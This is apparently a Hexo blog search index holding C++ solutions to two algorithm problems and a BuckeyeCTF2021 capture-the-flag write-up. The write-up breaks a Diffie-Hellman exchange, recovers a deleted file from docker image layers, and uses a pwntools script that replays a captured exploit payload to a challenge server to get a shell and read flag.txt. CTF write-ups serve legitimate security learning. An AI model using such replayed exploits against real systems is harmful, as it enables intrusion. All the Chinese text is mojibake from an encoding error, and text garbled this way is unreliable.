<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>01-å¤æ‚åº¦2 Maximum Subsequence Sumï¼ˆ25 åˆ†ï¼‰</title>
    <url>/posts/41173/</url>
    <content><![CDATA[<h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem:"></a>Problem:</h2><p>Given a sequence of KK integers {N1,N2,...,NK}. A continuous subsequence is defined to be {Ni,Ni+1,...,Nj} where 1â‰¤iâ‰¤jâ‰¤K1â‰¤iâ‰¤jâ‰¤K. The Maximum Subsequence is the continuous subsequence which has the largest sum of its elements. For example, given sequence { -2, 11, -4, 13, -5, -2 }, its maximum subsequence is { 11, -4, 13 } with the largest sum being 20.<br>Now you are supposed to find the largest sum, together with the first and the last numbers of the maximum subsequence.</p>
<span id="more"></span>
<h2 id="Input-Specification"><a href="#Input-Specification" class="headerlink" title="Input Specification:"></a>Input Specification:</h2><p>Each input file contains one test case. Each case occupies two lines. The first line contains a positive integerK(â‰¤10000). The second line contains K numbers, separated by a space.</p>
<h2 id="Output-Specification"><a href="#Output-Specification" class="headerlink" title="Output Specification:"></a>Output Specification:</h2><p>For each test case, output in one line the largest sum, together with the first and the last numbers of the maximum subsequence. The numbers must be separated by one space, but there must be no extra space at the end of a line. In case that the maximum subsequence is not unique, output the one with the smallest indices i and j (as shown by the sample case). If all the K numbers are negative, then its maximum sum is defined to be 0, and you are supposed to output the first and the last numbers of the whole sequence.<br>output the first and the last numbers of the whole sequence.</p>
<h2 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input:"></a>Sample Input:</h2><div class="note default no-icon"><p>10
-10 1 2 3 4 -5 -23 3 7 -21
</p></div>

<h2 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output:"></a>Sample Output:</h2><div class="note default no-icon"><p>10 1 4
</p></div>

<h2 id="ä»£ç ï¼š"><a href="#ä»£ç ï¼š" class="headerlink" title="ä»£ç ï¼š"></a>ä»£ç ï¼š</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"></span><br><span class="line">ll Start, End;</span><br><span class="line"><span class="type">int</span> a[<span class="number">1000006</span>];</span><br><span class="line">ll n;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">MaxSubseqSum2</span><span class="params">( <span class="type">int</span> A[], <span class="type">int</span> N )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> ThisSum, MaxSum = <span class="number">-0xffff</span>;</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="keyword">for</span>( i = <span class="number">0</span>; i &lt; N; i++ )   <span class="comment">/* iæ˜¯å­åˆ—å·¦ç«¯ä½ç½® */</span></span><br><span class="line">    &#123;</span><br><span class="line">        ThisSum = <span class="number">0</span>;  <span class="comment">/* ThisSumæ˜¯ä»A[i]åˆ°A[j]çš„å­åˆ—å’Œ */</span></span><br><span class="line">        <span class="keyword">for</span>( j = i; j &lt; N; j++ )   <span class="comment">/* jæ˜¯å­åˆ—å³ç«¯ä½ç½® */</span></span><br><span class="line">        &#123;</span><br><span class="line">            ThisSum += A[j];        <span class="comment">/*å¯¹äºç›¸åŒçš„iï¼Œä¸åŒçš„jï¼Œåªè¦åœ¨j-1æ¬¡å¾ªç¯çš„åŸºç¡€ä¸Šç´¯åŠ 1é¡¹å³å¯*/</span></span><br><span class="line">            <span class="keyword">if</span>( ThisSum &gt; MaxSum ) <span class="comment">/* å¦‚æœåˆšå¾—åˆ°çš„è¿™ä¸ªå­åˆ—å’Œæ›´å¤§ */</span></span><br><span class="line">            &#123;</span><br><span class="line">                MaxSum = ThisSum;    <span class="comment">/* åˆ™æ›´æ–°ç»“æœ */</span></span><br><span class="line">                Start = A[i];</span><br><span class="line">                End = A[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="comment">/* jå¾ªç¯ç»“æŸ */</span></span><br><span class="line">    &#125; <span class="comment">/* iå¾ªç¯ç»“æŸ */</span></span><br><span class="line">    <span class="keyword">return</span> MaxSum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">input</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span>(ll i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cin &gt;&gt; a[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">output</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> temp = <span class="built_in">MaxSubseqSum2</span>(a, n);</span><br><span class="line">    <span class="keyword">if</span>(temp &lt; <span class="number">0</span>)</span><br><span class="line">        cout &lt;&lt; <span class="number">0</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; a[<span class="number">0</span>] &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; a[n - <span class="number">1</span>] &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        cout &lt;&lt; <span class="built_in">MaxSubseqSum2</span>(a, n) &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; Start &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; End &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin.<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">input</span>();</span><br><span class="line">    <span class="built_in">output</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¸¤é‡å¾ªç¯éå†ï¼Œç®—æ³•å¤æ‚åº¦ä¸ºOï¼ˆN^2ï¼‰ï¼›<br>ç¬¬ä¸€æ¬¡æäº¤æœ‰éƒ¨åˆ†æµ‹è¯•ç‚¹æ²¡é€šè¿‡ï¼Œå…¶åŸå› æ˜¯å¯¹æœ€å¤§å’Œå°äº0æ—¶çš„æƒ…å†µæ²¡å¤„ç†å¥½ã€‚</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>æ•°æ®ç»“æ„_é™ˆè¶Šã€ä½•é’¦é“­</category>
      </categories>
      <tags>
        <tag>æ•°æ®ç»“æ„</tag>
      </tags>
  </entry>
  <entry>
    <title>2017ç™¾åº¦ä¹‹æ˜Ÿèµ„æ ¼èµ› 1003 åº¦åº¦ç†Šä¸é‚ªæ¶å¤§é­”ç‹ï¼ˆå®Œå…¨èƒŒåŒ…ï¼‰</title>
    <url>/posts/53776/</url>
    <content><![CDATA[<h2 id="åº¦åº¦ç†Šä¸é‚ªæ¶å¤§é­”ç‹"><a href="#åº¦åº¦ç†Šä¸é‚ªæ¶å¤§é­”ç‹" class="headerlink" title="åº¦åº¦ç†Šä¸é‚ªæ¶å¤§é­”ç‹"></a>åº¦åº¦ç†Šä¸é‚ªæ¶å¤§é­”ç‹</h2><p>Accepts: 2016<br>Submissions: 12307<br>Time Limit: 2000&#x2F;1000 MS (Java&#x2F;Others)<br>Memory Limit: 32768&#x2F;32768 K (Java&#x2F;Others)<br>ä¼ é€é—¨: <a href="http://bestcoder.hdu.edu.cn/contests/contest_showproblem.php?cid=774&pid=1003">bestcoder</a></p>
<span id="more"></span>

<h2 id="Problem-Description"><a href="#Problem-Description" class="headerlink" title="Problem Description"></a>Problem Description</h2><p>åº¦åº¦ç†Šä¸ºäº†æ‹¯æ•‘å¯çˆ±çš„å…¬ä¸»ï¼Œäºæ˜¯ä¸é‚ªæ¶å¤§é­”ç‹æˆ˜æ–—èµ·æ¥ã€‚<br>é‚ªæ¶å¤§é­”ç‹çš„éº¾ä¸‹æœ‰nä¸ªæ€ªå…½ï¼Œæ¯ä¸ªæ€ªå…½æœ‰a[i]çš„ç”Ÿå‘½å€¼ï¼Œä»¥åŠb[i]çš„é˜²å¾¡åŠ›ã€‚<br>åº¦åº¦ç†Šä¸€å…±æ‹¥æœ‰mç§æ”»å‡»æ–¹å¼ï¼Œç¬¬iç§æ”»å‡»æ–¹å¼ï¼Œéœ€è¦æ¶ˆè€—k[i]çš„æ™¶çŸ³ï¼Œé€ æˆp[i]ç‚¹ä¼¤å®³ã€‚<br>å½“ç„¶ï¼Œå¦‚æœåº¦åº¦ç†Šä½¿ç”¨ç¬¬iä¸ªæŠ€èƒ½æ‰“åœ¨ç¬¬jä¸ªæ€ªå…½ä¸Šé¢çš„è¯ï¼Œä¼šä½¿å¾—ç¬¬jä¸ªæ€ªå…½çš„ç”Ÿå‘½å€¼å‡å°‘p[i]-b[j]ï¼Œå½“ç„¶å¦‚æœä¼¤å®³å°äºé˜²å¾¡ï¼Œé‚£ä¹ˆæ”»å‡»å°±ä¸ä¼šå¥æ•ˆã€‚<br>å¦‚æœæ€ªå…½çš„ç”Ÿå‘½å€¼é™ä¸º0æˆ–ä»¥ä¸‹ï¼Œé‚£ä¹ˆæ€ªå…½å°±ä¼šè¢«æ¶ˆç­ã€‚<br>å½“ç„¶æ¯ä¸ªæŠ€èƒ½éƒ½å¯ä»¥ä½¿ç”¨æ— é™æ¬¡ã€‚<br>è¯·é—®åº¦åº¦ç†Šæœ€å°‘æºå¸¦å¤šå°‘æ™¶çŸ³ï¼Œå°±å¯ä»¥æ¶ˆç­æ‰€æœ‰çš„æ€ªå…½ã€‚</p>
<h2 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h2><p>æœ¬é¢˜åŒ…å«è‹¥å¹²ç»„æµ‹è¯•æ•°æ®ã€‚<br>ç¬¬ä¸€è¡Œä¸¤ä¸ªæ•´æ•°nï¼Œm,è¡¨ç¤ºæœ‰nä¸ªæ€ªå…½ï¼Œmç§æŠ€èƒ½ã€‚<br>æ¥ä¸‹æ¥nè¡Œï¼Œæ¯è¡Œä¸¤ä¸ªæ•´æ•°ï¼Œa[i],b[i]ï¼Œåˆ†åˆ«è¡¨ç¤ºæ€ªå…½çš„ç”Ÿå‘½å€¼å’Œé˜²å¾¡åŠ›ã€‚<br>å†æ¥ä¸‹æ¥mè¡Œï¼Œæ¯è¡Œä¸¤ä¸ªæ•´æ•°k[i]å’Œp[i]ï¼Œåˆ†åˆ«è¡¨ç¤ºæŠ€èƒ½çš„æ¶ˆè€—æ™¶çŸ³æ•°ç›®å’ŒæŠ€èƒ½çš„ä¼¤å®³å€¼ã€‚<br>æ•°æ®èŒƒå›´:</p>
<div class="note default no-icon"><p>1<=n<=100000
1<=m<=1000
1<=a[i]<=1000
0<=b[i]<=10
0<=k[i]<=100000
0<=p[i]<=1000
</p></div>

<h2 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h2><p>å¯¹äºæ¯ç»„æµ‹è¯•æ•°æ®ï¼Œè¾“å‡ºæœ€å°çš„æ™¶çŸ³æ¶ˆè€—æ•°é‡ï¼Œå¦‚æœä¸èƒ½å‡»è´¥æ‰€æœ‰çš„æ€ªå…½ï¼Œè¾“å‡º-1</p>
<h2 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input"></a>Sample Input</h2><div class="note default no-icon"><p>1 2
3 5
7 10
6 8
1 2
3 5
10 7
8 
</p></div>

<h2 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output"></a>Sample Output</h2><div class="note default no-icon"><p>8
16
</p></div>

<h2 id="Acepptedä»£ç "><a href="#Acepptedä»£ç " class="headerlink" title="Acepptedä»£ç "></a>Acepptedä»£ç </h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Problem:åº¦åº¦ç†Šä¸é‚ªæ¶å¤§é­”ç‹</span></span><br><span class="line"><span class="comment">Author:QiZhao</span></span><br><span class="line"><span class="comment">Data:2017-08-05</span></span><br><span class="line"><span class="comment">Description:DPï¼Œå®Œå…¨èƒŒåŒ…</span></span><br><span class="line"><span class="comment">Copyright  2017 QiZhao. All rights reserved.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">1020</span>;</span><br><span class="line"><span class="type">const</span> ll INF=<span class="number">0x3f3f3f3f</span>;</span><br><span class="line"></span><br><span class="line">ll num[maxn][<span class="number">12</span>];<span class="comment">//é˜²å¾¡å€¼ä¸ºjï¼Œç”Ÿå‘½å€¼ä¸ºiçš„æ€ªç‰©çš„ä¸ªæ•°</span></span><br><span class="line">ll dp[<span class="number">1020</span>][<span class="number">15</span>];<span class="comment">//å¯¹äºç”Ÿå‘½å€¼ä¸ºiï¼Œé˜²å¾¡å€¼ä¸ºjçš„æ€ªç‰©æ‰€æ¶ˆè€—çš„æœ€å°æ°´æ™¶æ•°</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">skill</span></span><br><span class="line">&#123;</span><br><span class="line">    ll hit;</span><br><span class="line">    ll price;</span><br><span class="line">&#125; a[maxn];</span><br><span class="line">ll best[maxn];<span class="comment">//æ”»å‡»åŠ›ä¸ºiæ—¶ï¼Œæ¶ˆè€—çš„æœ€å°‘æ°´æ™¶æ•°ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="function">ll <span class="title">min</span><span class="params">(ll a,ll b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a&gt;b)</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">complete_packet</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> p)</span><span class="comment">//pä¸ºæ”»å‡»åŠ›ï¼Œkä¸ºæ¶ˆè€—æ°´æ™¶æ•°</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> b = <span class="number">0</span>; b &lt;= <span class="number">10</span>; ++b)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (b &gt;= p)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> d = p - b;</span><br><span class="line">            <span class="comment">//è¡€é‡å°äºæ”»å‡»</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> a = <span class="number">1</span>; a &lt;= d; ++a)</span><br><span class="line">            &#123;</span><br><span class="line">                dp[a][b] = <span class="built_in">min</span>(dp[a][b], k);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//è¡€é‡å¤§äºæ”»å‡»</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> a = d + <span class="number">1</span>; a &lt;= <span class="number">1000</span>; ++a)</span><br><span class="line">            &#123;</span><br><span class="line">                dp[a][b] = <span class="built_in">min</span>(dp[a][b], dp[a - d][b] + k);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin.<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    ll n, m;</span><br><span class="line">    ll x, y;</span><br><span class="line">    ll <span class="comment">/*max_hp = -0xffff,*/</span> max_def = -INF, max_hit = -INF;</span><br><span class="line">    <span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; m)</span><br><span class="line">    &#123;</span><br><span class="line">        max_def = -INF, max_hit = -INF;</span><br><span class="line">        <span class="built_in">memset</span>(num, <span class="number">0</span>, <span class="built_in">sizeof</span>(num));</span><br><span class="line">        <span class="built_in">memset</span>(a, <span class="number">0</span>, <span class="built_in">sizeof</span>(a));</span><br><span class="line">        <span class="built_in">memset</span>(best, <span class="number">-1</span>, <span class="built_in">sizeof</span>(best));</span><br><span class="line">        <span class="built_in">memset</span>(dp, <span class="number">0</span>, <span class="built_in">sizeof</span>(dp));</span><br><span class="line">        <span class="keyword">for</span>(ll i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            cin &gt;&gt; x &gt;&gt; y;</span><br><span class="line">            num[x][y]++;</span><br><span class="line">            <span class="comment">//if(x &gt;= max_hp)</span></span><br><span class="line">            <span class="comment">//max_hp = x;</span></span><br><span class="line">            <span class="keyword">if</span>(y &gt;= max_def)</span><br><span class="line">                max_def = y;</span><br><span class="line">        &#125;</span><br><span class="line">        ll flag = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(ll i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            cin &gt;&gt; x &gt;&gt; y;</span><br><span class="line">            <span class="keyword">if</span>(best[y] == <span class="number">-1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                a[flag].hit = y;</span><br><span class="line">                a[flag].price = x;</span><br><span class="line">                best[y] = x;</span><br><span class="line">                <span class="keyword">if</span>(a[flag].hit &gt; max_hit)</span><br><span class="line">                    max_hit = a[flag].hit;</span><br><span class="line">                flag++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(x &lt; best[y])</span><br><span class="line">                    best[y] = x;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ll ans = <span class="number">0</span>;</span><br><span class="line">        ll temp = <span class="number">0</span>; <span class="comment">//è®°å½•å·²å¤„ç†æ€ªç‰©ä¸ªæ•°ï¼Œä¼˜åŒ–æ—¶é—´</span></span><br><span class="line">        <span class="keyword">if</span>(max_def &gt;= max_hit)</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;-1&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">1010</span>; ++i)<span class="comment">//åˆå§‹åŒ–DP</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= <span class="number">10</span>; ++j)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        dp[i][j] = <span class="number">0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        dp[i][j] = INF;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;flag;i++)</span><br><span class="line">                <span class="built_in">complete_packet</span>(best[a[i].hit],a[i].hit);</span><br><span class="line">            <span class="keyword">for</span>(ll i = <span class="number">0</span>; i &lt; <span class="number">1002</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(temp == n)<span class="comment">//ä¼˜åŒ–æ—¶é—´</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">for</span>(ll j = <span class="number">0</span>; j &lt; <span class="number">12</span>; j++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(num[i][j] != <span class="number">0</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        temp += num[i][j];</span><br><span class="line">                        ans += dp[i][j]*num[i][j];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>ACM</category>
      </categories>
      <tags>
        <tag>ç™¾åº¦ä¹‹æ˜Ÿ</tag>
        <tag>å®Œå…¨èƒŒåŒ…</tag>
        <tag>ACM</tag>
      </tags>
  </entry>
  <entry>
    <title>BuckeyeCTF2021 Writeup</title>
    <url>/posts/4120451577/</url>
    <content><![CDATA[<h1 id="Key-Exchange"><a href="#Key-Exchange" class="headerlink" title="Key Exchange"></a>Key Exchange</h1><p><em>Let&#39;s exchange the flag (securely):</em><br><em>nc crypto.chall.pwnoh.io 13374</em></p>
<hr>
<p>åˆ†æç»™å‡ºçš„ä»£ç ,å‘ç°å½“è¾“å…¥çš„Bç­‰äºgçš„æ—¶å€™,Açš„å€¼å³ä¸º<code>shared_secret</code>,ä»è€Œå¯ä»¥å¾—åˆ°AESå¯†é’¥,è§£å¯†åå³å¯å¾—åˆ°flag.</p>
<p>ä½¿ç”¨ncè¿æ¥æœåŠ¡å™¨:</p>
<pre><code class="shell">â•­â”€ ~/CTF/BuckeyeCTF2021
â•°â”€$ nc crypto.chall.pwnoh.io 13374
I&#39;m going to send you the flag.
However, I noticed that an FBI agent has been eavesdropping on my messages,
so I&#39;m going to send it to you in a way that ONLY YOU can decrypt the flag.

p = 10880518517873967643757501014080864657695946662967756945469976115601889926901188881654458659008874387964581741306546485865737476973040012870453076020399351
g = 5
A = 6446823763385202977767001480185601116794559100492085785295943164615816598597259338015414246293095497644717507604784350316218874347470456507125850300019180
Give me your public key B: 5
ciphertext = a54eef574e0764239040ee22ffe762c907e7390372bf7de1f8ea7db0fa8218490890d545e5694332c8de1154fdff4cfb830a304df635217155b453bd12beb4e8
</code></pre>
<p>ä»£ç </p>
<pre><code class="python">def decrypt():
    shared_secret = 6446823763385202977767001480185601116794559100492085785295943164615816598597259338015414246293095497644717507604784350316218874347470456507125850300019180
    key = hashlib.sha1(cun.long_to_bytes(shared_secret)).digest()[:16]
    cipher = AES.new(key, AES.MODE_ECB)
    message = 0xa54eef574e0764239040ee22ffe762c907e7390372bf7de1f8ea7db0fa8218490890d545e5694332c8de1154fdff4cfb830a304df635217155b453bd12beb4e8
    plaintext = cipher.decrypt(cun.long_to_bytes(message))
    print(plaintext)

decrypt()
</code></pre>
<p><strong>flag:</strong><code>buckeye&#123;DH_1s_s0_h3ck1ng_c00l_l1k3_wh0_w0uldv3_th0ught_0f_th1s?&#125;</code></p>
<h1 id="layers"><a href="#layers" class="headerlink" title="layers"></a>layers</h1><p><em>Check out my brand new docker repo <a href="https://hub.docker.com/r/qxxxb/layers">https://hub.docker.com/r/qxxxb/layers</a></em></p>
<hr>
<p>æŸ¥çœ‹é•œåƒå†å²,å‘ç°æ›¾ç»å­˜åœ¨ä¸€ä¸ª<code>flag.png</code>,ä½†æ˜¯è¢«åˆ é™¤äº†</p>
<pre><code class="shell">[root@VM-8-4-centos ~] docker history qxxxb/layers
IMAGE          CREATED       CREATED BY                                      SIZE      COMMENT
0c01a25ae5b7   5 days ago    /bin/sh -c echo &quot;Sorry, the flag has been deâ€¦   36B
&lt;missing&gt;      5 days ago    /bin/sh -c rm flag.png                          0B
&lt;missing&gt;      5 days ago    /bin/sh -c #(nop) COPY multi:6b3bd56201fda03â€¦   599kB
&lt;missing&gt;      8 weeks ago   /bin/sh -c #(nop)  CMD [&quot;/bin/sh&quot;]              0B
&lt;missing&gt;      8 weeks ago   /bin/sh -c #(nop) ADD file:aad4290d27580cc1aâ€¦   5.6MB
</code></pre>
<p>ä½¿ç”¨<code>docker save</code>å°†é•œåƒä¿å­˜æˆtaråŒ…å¹¶è§£å‹,ç„¶åå†è§£å‹æ¯ä¸€å±‚æ–‡ä»¶å¤¹ä¸­ä¸­çš„<code>layer.tar</code>æ‰¾åˆ°<code>flag.png</code></p>
<pre><code class="shell">[root@VM-8-4-centos ~] docker save qxxxb/layers -o a.tar
[root@VM-8-4-centos ~]# tar xvf a.tar
0c01a25ae5b745b06c68c7b870b848f327227e06feca8f121c105d3cc423ebc9.json
7c029681dc775f74b57cccd272523fd31a20f89cc2db9b514981fcbfb467b5c8/
7c029681dc775f74b57cccd272523fd31a20f89cc2db9b514981fcbfb467b5c8/VERSION
7c029681dc775f74b57cccd272523fd31a20f89cc2db9b514981fcbfb467b5c8/json
7c029681dc775f74b57cccd272523fd31a20f89cc2db9b514981fcbfb467b5c8/layer.tar
8771987229b6efdf7a40855b92529d9287e96ead2f6668d84f6a07809818db52/
8771987229b6efdf7a40855b92529d9287e96ead2f6668d84f6a07809818db52/VERSION
8771987229b6efdf7a40855b92529d9287e96ead2f6668d84f6a07809818db52/json
8771987229b6efdf7a40855b92529d9287e96ead2f6668d84f6a07809818db52/layer.tar
c37364b4cf72fc0eb131ee6d62795ef9cf3641340dd0aa8da6849b4c9cd5c41f/
c37364b4cf72fc0eb131ee6d62795ef9cf3641340dd0aa8da6849b4c9cd5c41f/VERSION
c37364b4cf72fc0eb131ee6d62795ef9cf3641340dd0aa8da6849b4c9cd5c41f/json
c37364b4cf72fc0eb131ee6d62795ef9cf3641340dd0aa8da6849b4c9cd5c41f/layer.tar
c6dd22d66071385f6a0d7242a2f2a895073c8ab84871b56390a3449038a49727/
c6dd22d66071385f6a0d7242a2f2a895073c8ab84871b56390a3449038a49727/VERSION
c6dd22d66071385f6a0d7242a2f2a895073c8ab84871b56390a3449038a49727/json
c6dd22d66071385f6a0d7242a2f2a895073c8ab84871b56390a3449038a49727/layer.tar
manifest.json
repositories
[root@VM-8-4-centos ~]# tar xvf 7c029681dc775f74b57cccd272523fd31a20f89cc2db9b514981fcbfb467b5c8/layer.tar
Dockerfile
flag.png
</code></pre>
<p><img data-src="/../../CTF/BuckeyeCTF2021/Misc/images/flag.png" alt="flag"></p>
<p><strong>flag:</strong><code>buckeye&#123;D0CK3R_H4S_L4Y3RS&#125;</code></p>
<h1 id="replay"><a href="#replay" class="headerlink" title="replay"></a>replay</h1><p><em>Somebody pwned my app! Luckily I managed to capture the network traffic of their exploit. Oh by the way, the same app is also running on <code>misc.chall.pwnoh.io</code> on port <code>13371</code>. Can you pwn it for me?</em></p>
<hr>
<p>ä½¿ç”¨<a href="https://www.wireshark.org/download.html">Wireshark</a>åˆ†æ<code>replay.pcap</code>æ–‡ä»¶,è·Ÿè¸ªTCPæµ,å‘ç°ä¼¼ä¹æ˜¯å‘é€äº†ä¸€äº›æ•°æ®æ‹¿åˆ°Shellæƒé™å,æ‰§è¡Œäº†ä¸€äº›å‘½ä»¤.</p>
<p>å¯¹ç€â€œDataâ€å³é”®,é€‰æ‹©â€œå¯¼å‡ºåˆ†ç»„å­—èŠ‚æµâ€,ä¿å­˜å­—èŠ‚æµæ•°æ®è‡³<code>a.bin</code></p>
<img data-src="../../CTF/BuckeyeCTF2021/Misc/images/replay-1.png" alt="image-20211027235735902" style="zoom:60%;" />

<p>ç¼–å†™è„šæœ¬,ä½¿ç”¨<a href="https://github.com/Gallopsled/pwntools">pwn</a>è¿æ¥æœåŠ¡å™¨å¹¶å‘é€æ•°æ®,æ‰§è¡Œshellå‘½ä»¤,æ‰¾åˆ°<code>flag.txt</code>æ–‡ä»¶</p>
<pre><code class="shell">â•­â”€ ~/CTF/BuckeyeCTF2021
â•°â”€$ python a.py
[+] Opening connection to misc.chall.pwnoh.io on port 13371: Done
[*] Switching to interactive mode
$ ls
chall
flag.txt
$ cat flag.txt
buckeye&#123;g00d_th1ng_P1E_w4s_d1s4bl3d_0n_th3_b1n4ry&#125;
</code></pre>
<p>ä»£ç :</p>
<pre><code class="python">from pwn import *
p = remote(&#39;misc.chall.pwnoh.io&#39;, 13371)
p.recvuntil(b&#39;TODAY&#39;, drop=True)
p.recvline()
with open(&#39;a.bin&#39;,&#39;rb&#39;) as f:
    data  = f.read()
p.send(data)
p.interactive()
p.close()
</code></pre>
<p><strong>flag:</strong><code>buckeye&#123;g00d_th1ng_P1E_w4s_d1s4bl3d_0n_th3_b1n4ry&#125;</code></p>
<h1 id="Buttons"><a href="#Buttons" class="headerlink" title="Buttons"></a>Buttons</h1><p><em>Anyone taken Software 1? Can you help me figure out what this weird Java program does?</em></p>
<hr>
<p>ç”¨<a href="http://www.javadecompilers.com/">javadecompilers</a>åç¼–è¯‘<code>Buttons.jar</code>å¾—åˆ°æºç .</p>
<p>è§‚å¯Ÿåˆ°æœ‰ä¸€ä¸ª<code>printFlag</code>å‡½æ•°,ä½†æ˜¯ä¾èµ–äº<code>moveHistory</code>,æ‰€ä»¥ä¸èƒ½é€šè¿‡ç›´æ¥è¿è¡Œ<code>printFlag</code>æ¥å¾—åˆ°flag.</p>
